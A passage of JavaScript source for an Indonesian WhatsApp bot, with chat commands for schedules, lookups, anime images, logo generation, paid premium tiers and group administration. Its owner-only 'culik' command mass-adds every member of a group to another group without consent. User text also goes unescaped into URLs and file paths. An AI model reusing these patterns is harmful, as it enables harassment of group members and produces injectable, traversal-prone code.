limitAdd(sender, limit)
}
break            
case 'jadwaltv': {                        
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/jadwaltv?apikey=${daniapi}`)
let teks = `「 *JADWAL TV* 」\n\n`
for (let i of res.result) {
teks += `❏ *Channel* : ${i.channel}\n`           
teks += `❏ *Acara* : ${i.result.acara}\n`           
teks += `❏ *Jam* : ${i.result.jam}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'jadwaltvnow': {                        
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/jadwaltvnow?apikey=${daniapi}`)
let teks = `「 *JADWAL TV NOW* 」\n\n`
for (let i of res.result) {
teks += `❏ *Acara* : ${i.acara}\n`           
teks += `❏ *Channel* : ${i.channel}\n`           
teks += `❏ *Jam* : ${i.jam}\n`                       
teks += `❏ *Source* : ${i.source}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'jadwalbola': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/jadwalbola?apikey=${daniapi}`)
let capt = `「 *JADWAL BOLA* 」\n\n`
for (let i of res.result){
capt += `❏ *Jadwal* : ${i.jadwal}\n`
capt += `❏ *Tanggal* : ${i.tanggal}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumb, capt, freply)
limitAdd(sender, limit)
}
break        
case 'kodepos': {         
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		  
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/kodepos?query=${text}&apikey=${daniapi}`)
let teks = `「 *KODE POS* 」\n\n`
for (let i of res.result) {
teks += `❏ *Provinsi* : ${i.province}\n`                         
teks += `❏ *Kota* : ${i.city}\n`                         
teks += `❏ *Subdistrict* : ${i.subdistrict}\n`                              
teks += `❏ *Urban* : ${i.urban}\n`           
teks += `❏ *Kode* : ${i.postalcode}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'kbbi': {                    
addCountCmd(`#${command.slice(0)}`, sender, _cmd)    
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/kbbi?query=${text}&apikey=${daniapi}`)
let { arti, lema } = res.result
let capt = `「 *KBBI* 」

❏ *Lema* : ${lema}
❏ *Arti* : ${arti}`
textImg(capt)
limitAdd(sender, limit)
}
break         
case 'turnbackhoax': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/information/turnbackhoax?apikey=${daniapi}`)
let capt = `「 *TURN BACK HOAX* 」\n\n`
for (let i of res.result){
capt += `❏ *Title* : ${i.title}\n`
capt += `❏ *Desc* : ${i.desc}\n`
capt += `❏ *Date* : ${i.date}\n`
capt += `❏ *Link* : ${i.link}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].thumbnail, capt, freply)
limitAdd(sender, limit)
}
break           
case 'kartun': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.apkk
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/kartun?query=${text}&apikey=${daniapi}`)
let capt = `「 *KARTUN* 」\n\n`
for (let i of res.result){
capt += `❏ *Sinopsis* : ${i.sinopsis}\n`
capt += `❏ *Link* : ${i.link}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].image, capt, freply)
limitAdd(sender, limit)
}
break           
case 'action': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/action?apikey=${daniapi}`)
let capt = `「 *ACTION* 」\n\n`
for (let i of res.result){
capt += `❏ *Sinopsis* : ${i.sinopsis}\n`
capt += `❏ *Link* : ${i.link}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break           
case 'comedy': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/comedy?apikey=${daniapi}`)
let capt = `「 *COMEDY* 」\n\n`
for (let i of res.result){
capt += `❏ *Sinopsis* : ${i.sinopsis}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break           
case 'military': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/military?apikey=${daniapi}`)
let capt = `「 *MILITARY* 」\n\n`
for (let i of res.result){
capt += `❏ *Sinopsis* : ${i.sinopsis}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break          
case 'drama': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/movie/drama?apikey=${daniapi}`)
let capt = `「 *DRAMA* 」\n\n`
for (let i of res.result){
capt += `❏ *Sinopsis* : ${i.sinopsis}\n`
capt += `❏ *Url* : ${i.url}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break           
case 'tokohindo': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let res = await fetchJson(`${webdani}/api/other/tokohindo?apikey=${daniapi}`)
let capt = `「 *TOKOH INDO* 」\n\n`
for (let i of res.result){
capt += `❏ *Nama* : ${i.nama}\n`           
capt += `❏ *Nama 2* : ${i.nama2}\n`             
capt += `❏ *Kategori* : ${i.kategori}\n`             
capt += `❏ *Asal* : ${i.asal}\n`             
capt += `❏ *Lahir* : ${i.lahir}\n`             
capt += `❏ *Usia* : ${i.usia}\n`           
capt += `❏ *Gugur* : ${i.gugur}\n`           
capt += `❏ *Lokasi Makam* : ${i.lokasimakam}\n`                            
capt += `❏ *History* : ${i.history}\n\n\n`
}
Dani.sendImage(m.chat, res.result[0].img, capt, freply)
limitAdd(sender, limit)
}
break     
case 'loli': case 'natsukawa': case 'kuroha': case 'kuriyama': case 'kosaki': case 'chitanda': case 'tomori': case 'sagiri': case 'nishimiya': case 'natsukawa': case 'yatogami': case 'waifu': case 'akiyama': case 'ayuzawa': case 'milf': case 'husbu': case 'deidara': case 'chitoge':  case 'boruto':  case 'asuna': case 'ana': case 'erza':  case 'elaina': case 'eba': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/randomanime/${command}?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'gremory': case 'hestia': case 'hinata': case 'kaga': case 'itori': case 'itachi': case 'isuzu': case 'inori': case 'kotori': case 'keneki': case 'kaori': case 'kakasi': case 'kagura': case 'minato': case 'miku': case 'mikasa': case 'madara': case 'kurumi': case 'sasuke': case 'sakura': case 'rize': case 'onepiece': case 'nezuko': case 'shota': case 'shizuka': case 'shinomiya': case 'shinka': case 'shina': case 'yuki': case 'yotsuba': case 'tsunade': case 'toukachan': case 'tejina': case 'chiho': case 'akira': case 'emilia': case 'yumeko': case 'shinobu': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/randomanime/${command}?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'blood-frosted': case 'style-1917': case 'logo-galaxy': case 'neon-effects': case 'birthday-greeting': case 'blue-glitter': case 'gold-glitter': case 'rainbow-effect': case 'heart-birthday': case 'birthday-roses': case 'typography-maker1': case 'tattoo-dragon': case 'machines-effect': case 'typography-autumn': case 'typography-leaves': case 'modern-gold-red3': case 'modern-gold-green3': case 'modern-gold-sliver3': case 'light': case 'red-hot-metal': case 'modern-gold-purple3': case 'hero-crossfire': case 'swat-crossfire': case 'arch-crossfire': case 'metal-effect': case 'water-effect': case 'sfg-crossfire': case 'torbjornplate-overwatch': case 'lend': case 'golden-letter': case 'magic': case 'metallic-letter': case 'resht-league-of-kings': case 'mganga-league-of-kings': case 'gold-effect': case 'mei-overwatch': case 'soldier-overwatch': case 'birthday-cake2': case 'name-on-hot-air-ballon': case 'violet-league-of-kings': case 'alice-league-of-kings': case 'azzenka-league-of-kings': case 'bulb-effect': case 'modern-gold5-pro': case 'modern-gold4': case 'modern-gold3': case 'birthday-cake3': case 'fun-certify1': case 'graffiti5': case 'graffiti4': case 'graffiti3': case 'graffiti2': case 'fun-certify2': case 'blood': case 'water-3d': case 'galaxy-effect2': case 'galaxy-effect': case 'wings-effect': case '3d-neonlight': case '3d-luxury': case '3d-love': case '3d-golden': case '3d-engraved': case '3d-waterpipe': case '3d-scifi': case '3d-rainbow': case '3d-papercut': case '3d-gradient': case '3d-underwater': case '3d-stone': case '3d-sub-zombie': case '3d-ruby-stone': case '3d-realistic': case 'bear': case 'assassin-screed': case 'art-shader': case 'anubis': case 'angel-wings-galaxy': case 'broken-glass': case 'brickwall': case 'blackpink': case 'black-metal': case 'bg-crossfire': case 'dark-gold-metal': case 'cool-metal': case 'color-fireworks': case 'circuit': case 'bubble': case 'double-exposure': case 'dinamo': case 'deluxe-silver': case 'deluxe-gold': case 'decorated-cookie': case 'fox-crossfire': case 'firework': case 'fabric': case 'eroded-metal': case 'dragon-fire': case 'genji-overwatch': case 'gankk-league-of-kings': case 'galaxy': case 'galaxy-angel': case 'futuristic': case 'glossy-chrome': case 'glossy-carbon': case 'glossy-blue-metal': case 'glossy': case 'gem-stone': case 'gold-eagle': case 'gold-bird': case 'gold-batman': case 'gold-barca': case 'gold-avenger': case 'graffiti-color': case 'gold-tiger': case 'gold-star': case 'gold-lion': case 'gold-fox': case 'hanzo-overwatch': case 'halloween-fire': case 'green-horror': case 'green-brush': case 'gr-crossfire': case 'matrix': case 'holographic': case 'heart-flashlight': case 'heart-cups': case 'heart-birthday': case 'lol-fiora': case 'lol-ezrealand-shen': case 'lol-draven': case 'lol-caitlyn': case 'lol-ahri': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
sticWait(from)
Dani.sendMessage(m.chat, { image: { url: `${webdani}/api/textpro/${command}?text=${text}&apikey=${daniapi}` }, caption: mess.success }, { quoted: freply})
limitAdd(sender, limit)
}
break
case 'lol-jinx': case 'lol-jhin': case 'lol-graves': case 'lol-garen': case 'lol-fizz': case 'lol-rengar': case 'lol-kogmaw': case 'lol-kalista': case 'lol-missfortune': case 'lol-quinn': case 'lol-khazix': case 'lol-leesin': case 'lol-thresh': case 'lol-lux': case 'lol-talon': case 'lol-wukong': case 'lol-sona': case 'lol-riven': case 'lol-vayne': case 'lol-nidalee': case 'led': case 'lol-yasuo': case 'lol-master-yi': case 'lol-zed': case 'metal-real-madrid': case 'metal-headshot': case 'metal-avenger': case 'mercy-overwatch': case 'magma': case 'neon-bright-blue': case 'minion': case 'metalic': case 'metal-superman': case 'metal-star': case 'paper-cut': case 'neon-light': case 'neon-devil': case 'neon-satin': case 'neon-light-galaxy': case 'sketch': case 'skeleton': case 'science': case 'reaper-overwatch': case 'paper-art': case 'wetglass': case 'word-leaves': case 'thunder': case 'sunlight-shadow': case 'snow': case 'status-mood2': case 'status-mood': case 'transformer': case 'wedding-silver': case 'watercolor': case 'status-life2': case 'status-life3': case 'status-life': case 'status-love': case 'status-mood4': case 'status-mood3': case 'word-green-fireworks': case 'wishes-birthdaycake': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!text) throw mess.textt
sticWait(from)
Dani.sendMessage(m.chat, { image: { url: `${webdani}/api/textpro/${command}?text=${text}&apikey=${daniapi}` }, caption: mess.success }, { quoted: freply})
limitAdd(sender, limit)
}
break
case 'juventus': case 'horror': case 'floral': case '3d-vintage': case 'avengers': case 'spiderman': case 'metal-molding': case 'metal-marvel': case 'marvel': case 'lion-mascot': case 'classic-8bit': case 'wolf': case 'wolf-galaxy': case 'glitch': case 'thor': case 'typography-green-leaf': case '3d-silver': case '3d-space': case 'gradient-logo': case 'layered': case '3d-galaxy-metal': case '3d-gold': case '3d-rose-gold': case 'balloons-cards': case 'balloons-love': case 'ninja-mascot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
let [text1, text2] = text.split`|`
if (!text1) throw `Example : ${prefix + command} Dani|XCode`
if (!text2) throw `Example : ${prefix + command} Dani|XCode`
sticWait(from)
Dani.sendMessage(m.chat, { image: { url: `${webdani}/api/textpro/${command}?text=${text1}&text2=${text2}&apikey=${daniapi}` }, caption: mess.success }, { quoted: freply})
limitAdd(sender, limit)
}
break
case 'mode': case 'set': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
const buttons = [
{buttonId: `self`, buttonText: {displayText: 'SELF'}, type: 1},
{buttonId: `public`, buttonText: {displayText: 'PUBLIC'}, type: 1}
]

const buttonMessage = {
text: "Pilih Salah Satu",
footerText: 'Hello Owner',
buttons: buttons,
headerType: 1
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}
break
case 'get': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!args[0]) return m.reply("Urlnya?")
if (!isUrl(text)) return m.reply("Hanya Link!")
try {
let gts = await fetchJson(args.join(" "))
textImg(gts)
} catch {
textImg("Error!")
}
}
break
case 'getcase': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args.length < 1) return m.reply("*Mau nyari case apa kak*") 
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("Dani.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
textImg(`${getCase(q)}`)
}
break
case 'getname': case 'getnama': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (qtod === "true") {
namenye = await Dani.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
Dani.sendMessage(from, {text:"Reply orangnya"}, {quoted:freply})
}
}
break
case 'getpic': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (qtod === "true") {
try {
pporg = await Dani.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
Dani.sendMessage(m.chat, { image : { url : pporg }, caption: mess.success }, { quoted : freply })
} else if (qtod === "false") {
try {
pporgs = await Dani.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
Dani.sendMessage(m.chat, { image : { url : pporgs }, caption: mess.success }, { quoted : freply })
}
}
break
case 'revoke':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins) return sticAdmin(from)
if (!isBotAdmins) return sticNotAdmin(from)
let link = await Dani.groupRevokeInvite(from)
textImg('Done' + `\n\n*New Link for ${groupName}* :\n https://chat.whatsapp.com/${link}`)
break
case 'setnamabot': case 'setnamebot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (!isCreator) return sticOwner(from)
if (!text) throw `Example : ${prefix + command} WhatsApp ✅`
let name = await Dani.updateProfileName(text)
m.reply(`Successfully renamed bot to ${name}`)
}
break
case 'setstatus': case 'setbiobot': case 'setbotbio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (!isCreator) return sticOwner(from)
if (!text) throw `this is a WhatsApp Bot named Dani 1337`
let name = await Dani.updateProfileStatus(text)
m.reply(`Successfully changed bot bio status to ${name}`)
}
break
case 'culik': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!m.isGroup) return sticGroup(from)
let pantek = []
for (let mem of participants) {
pantek.push(mem.jid)
}
Dani.groupParticipantsUpdate(args[0], pantek)
}
break
case 'getidgc':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
textImg(`${m.chat}`)
break
case 'buypremium': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let teks = `「 *BUY PREMIUM* 」\n\n❏ *8K* : 1 MINGGU\n❏ *15K* : 1 BULAN\n❏ *25k* : PERMANEN\n\n\n「 *NOTE* 」\nUntuk Membeli Premium Silahkan Langsung Hubungi Owner`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}
]
let buttonMessage = {
image: { url: `https://dani-uploader.xfar.repl.co/file/zqc4EQdTbBMi.png` },
caption: teks,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}
break
case 'sewabot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let teks = `「 *SEWA BOT* 」\n\n❏ *10K* : 1 MINGGU\n❏ *20* : 1 BULAN\n❏ *35k* : PERMANEN\n\n\n「 *NOTE* 」\nUntuk Sewa Bot Harap Langsung Hubungi Owner`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}
]
let buttonMessage = {
image: { url: `https://dani-uploader.xfar.repl.co/file/rIdmj9wUtt9u.jpeg` },
caption: teks,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}
break
case 'profile': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
try {
ppuser = await Dani.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
let teks = `「 *USER INFO* 」\n\n❏ *Username* : ${pushname}\n❏ *Number* : ${sender.split('@')[0]}\n❏ *Premium* : ${isPremium ? 'Yes' : 'No'}\n❏ *Owner* : ${isCreator ? 'Yes' : 'No'}\n❏ *Rank* : ${role}\n❏ *Level* : ${getLevelingLevel(sender)}\n❏ *Limit* : ${isCreator ? 'Unlimited' : getLimit(sender, limitCount, limit)}\n❏ *Limit Game* : ${isCreator ? 'Unlimited' : cekGLimit(sender, gcount, glimit)}\n❏ *XP* : ${getLevelingXp(sender)}/${reqXp}\n❏ *Belance* : $${(getBalance(sender, balance))}\n❏ *Link* : wa.me/${sender.split("@")[0]}`
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1}
]
let buttonMessage = {
image: { url: ppuser },
caption: teks,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}
break
case 'groupinfo': case 'infogroup': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
try{
var pic = await Dani.getProfilePicture(m.chat)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
let ingfo = `*G R O U P  I N F O*\n\n❏ *Name :* ${groupName}\n❏ *ID Group :* ${m.chat}\n❏ *Made :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n❏ *Group Owner:* @${groupMetadata.owner.split('@')[0]}\n❏ *Number Of Admins :* ${groupAdmins.length}\n❏ *Number Of Participants :* ${participants.length}\n❏ *Desc :* \n${groupMetadata.desc}`
ds = await getBuffer(pic)
Dani.sendMessage(m.chat, { image: ds,caption: ingfo, mentions: [groupMetadata.owner] }, { quoted: freply })
break
case 'creategc':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`*Example* : #creategc namagroup`)
let cret = await Dani.groupCreate(args.join(" "), [])
let response = await Dani.groupInviteCode(cret.id)
teks = `  「 *CREATE GROUP* 」

❏ *Name* : ${cret.subject}
❏ *Owner* : @${cret.owner.split("@")[0]}
❏ *Time* : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB


https://chat.whatsapp.com/${response}

`
textImg(teks)
break
case 'totag': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins) return sticAdmin(from)
if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
Dani.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'once': case 'toonce': { 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
let anu = await Dani.downloadAndSaveMediaMessage(quoted)
Dani.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: freply })
} else if (/video/.test(mime)) {
anu = await Dani.downloadAndSaveMediaMessage(quoted)
Dani.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: freply })
limitAdd(sender, limit)
}
}
break
case 'closetime':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Dani.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break
case 'opentime':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
Dani.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
break
case 'listban': case 'lisbanned':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
teks = '*List Banned*\n\n'
for (let Dani of ban) {
teks += `- ${Dani}\n`
}
teks += `\n*Total : ${ban.length}*`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'ban':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
ban.push(bnnd)
fs.writeFileSync('./database/ban.json', JSON.stringify(ban))
m.reply(`Nomor ${bnnd} Telah Di Ban!!!`)
break
case 'unban':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = ban.indexOf(ya)
ban.splice(unp, 1)
fs.writeFileSync('./database/ban.json', JSON.stringify(ban))
m.reply(`Nomor ${ya} Telah Di Unban!!!`)
break
case 'addsticker':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (!isQuotedSticker) return m.reply('Reply stiker')
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!text) return m.reply(`Nama Sticker Apa?`)
let mediac = await Dani.downloadMediaMessage(qmsg)
stiker.push(`${text}`)
fs.writeFileSync(`./storage/sticker/${text}.webp`, mediac)
fs.writeFileSync('./storage/sticker.json', JSON.stringify(stiker))
Dani.sendMessage(m.chat, { text: `Succes MenambahKan Sticker Ketik ${prefix}liststicker untuk melihan sticker` }, { quoted: freply })
break
case 'addimage':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (!isQuotedImage) return m.reply('Reply image')
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!text) return m.reply(`Nama Imagenya Apa?`)
let medial = await Dani.downloadMediaMessage(qmsg)
image.push(`${text}`)
fs.writeFileSync(`./storage/image/${text}.jpg`, medial)
fs.writeFileSync('./storage/image.json', JSON.stringify(image))
Dani.sendMessage(m.chat, { text: `Succes MenambahKan Image Ketik ${prefix}listimage untuk melihan image` }, { quoted: freply })
break
case 'addaudio': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (!isQuotedAudio) return m.reply('Reply Audio')
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (!text) return m.reply(`Nama Audionya Apa?`)
let audionya = await Dani.downloadMediaMessage(qmsg)
audio.push(`${text}`)
fs.writeFileSync(`./storage/audio/${q}.mp3`, audionya)
fs.writeFileSync('./storage/audio.json', JSON.stringify(audio))
